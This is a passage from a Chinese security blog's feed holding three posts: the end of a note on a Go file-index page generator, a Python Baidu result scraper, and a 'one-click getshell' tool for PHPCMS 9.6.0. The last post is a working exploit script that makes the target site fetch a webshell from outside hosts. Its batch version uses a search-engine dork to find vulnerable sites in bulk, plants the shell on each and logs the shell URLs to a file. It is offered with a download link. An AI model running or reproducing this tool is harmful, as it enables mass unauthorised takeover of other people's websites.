<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化<br>然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历<br>但是自从<strong>T00ls灵车漂移事件以来，官方管理员给<em>GetWriter</em>老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）</strong>，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写</p>
<h4 id="暂时实现的功能"><a href="#暂时实现的功能" class="headerlink" title="暂时实现的功能"></a>暂时实现的功能</h4><ul>
<li>支持模板</li>
<li>加入了配置文件（其实也是模板）</li>
<li>加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）<br>可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了</li>
</ul>
<h2 id="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"><a href="#更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看" class="headerlink" title="更新记录在下面，更新后的代码就不贴了，之前的代码我就在这个页面上删了，自己感兴趣可以上github查看"></a>更新记录在下面，更新后的代码就不贴了，<strong>之前的代码我就在这个页面上删了</strong>，自己感兴趣可以上github查看</h2><h2 id="至于前端"><a href="#至于前端" class="headerlink" title="至于前端"></a>至于前端</h2><p><del>你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改</del></p>
<p><strong>为它搞了一套css与文件类型图标</strong>（关于style.css文件，是需要你放到远端在线调用的，你可以上传到七牛，或者你同步的时候放到网站根目录下，然后通过域名+/style.css的方式来调用）</p>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><ul>
<li>对一部分冗余的进行了优化，提升了一丁点效率</li>
<li>可以放到环境变量path了，不需要放到本目录里了，只需要在本目录调用就可以（当然），按照之前的方法也是可以的</li>
</ul>
<hr>
<ul>
<li>对文件li列表做了排序，优先级为后缀名-&gt;文件名</li>
<li>对li列表加了css类，可以自定义li的css了，具体见生成后的文件</li>
<li>为页面生成器搞了一套css，为类型加上了图标，具体效果见下图<br><img src="https://ooo.0o0.ooo/2017/04/14/58f0f09499fda.png" alt="snipaste_20170414_235335.png"></li>
</ul>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>这次不能给抓住机会了，放github吧</p>
<ul>
<li><a href="https://github.com/akkuman/generateIndexHTML" target="_blank" rel="external">代码下载地址</a></li>
<li><a href="https://github.com/akkuman/generateIndexHTML/bin" target="_blank" rel="external">二进制文件下载地址</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的&lt;/p&gt;
&lt;h2 id=&quot;关于搭建&quot;&gt;&lt;a href=&quot;#关于搭建&quot; class=&quot;headerlink&quot; title=&quot;关于搭建&quot;&gt;&lt;/a&gt;关于搭建&lt;/h2&gt;&lt;p&gt;这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://hacktech.cn/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://hacktech.cn/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>百度搜索引擎取真实地址-python代码</title>
    <link href="http://hacktech.cn/2017/04/11/BaiduSearch-get-realUrl-with-python.html"/>
    <id>http://hacktech.cn/2017/04/11/BaiduSearch-get-realUrl-with-python.html</id>
    <published>2017-04-11T04:49:06.000Z</published>
    <updated>2017-09-13T04:56:13.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</div><div class="line">&#125;</div><div class="line"></div><div class="line">def parseBaidu(keyword, pagenum)</div><div class="line"></div><div class="line">def main():</div><div class="line">    for url in parseBaidu("keyword",10):</div><div class="line">        if url:</div><div class="line">            print(url)</div><div class="line">        else:</div><div class="line">            continue</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;parseBaidu&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(keyword, pagenum)&lt;/span&gt;:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    keywordsBaseURL = &lt;span class=&quot;string&quot;&gt;&#39;https://www.baidu.com/s?wd=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;oq=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;ie=utf-8&#39;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;pn=&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    pnum = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; pnum &amp;lt;= int(pagenum):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        baseURL = keywordsBaseURL + str(pnum*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            request = requests.get(baseURL, headers=headers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            soup = BeautifulSoup(request.text, &lt;span class=&quot;string&quot;&gt;&quot;html.parser&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; a &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; soup.select(&lt;span class=&quot;string&quot;&gt;&#39;div.c-container &amp;gt; h3 &amp;gt; a&#39;&lt;/span&gt;):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                url = requests.get(a[&lt;span class=&quot;string&quot;&gt;&#39;href&#39;&lt;/span&gt;], headers=headers).url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;None&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            pnum += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>phpcms9-6-0 一键getshell工具</title>
    <link href="http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
    <id>http://hacktech.cn/2017/04/10/phpcms9-6-0-getshell-with-python.html</id>
    <published>2017-04-10T05:13:29.000Z</published>
    <updated>2017-04-11T05:12:31.699Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
</ul>
<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
<li>[] 加入对有验证码phpcms网站的支持</li>
<li>[] 加入批量(<strong>已完成</strong>)</li>
</ul>
<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一键化&lt;code&gt;python 1.py http://xxx.com&lt;/code&gt;,如果是批量直接运行py文件即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;待办&quot;&gt;&lt;a href=&quot;#待办&quot; class=&quot;headerlink&quot; title=&quot;待办&quot;&gt;&lt;/a&gt;待办&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;[] 加入对有验证码phpcms网站的支持&lt;/li&gt;
&lt;li&gt;[] 加入批量(&lt;strong&gt;已完成&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
</feed>
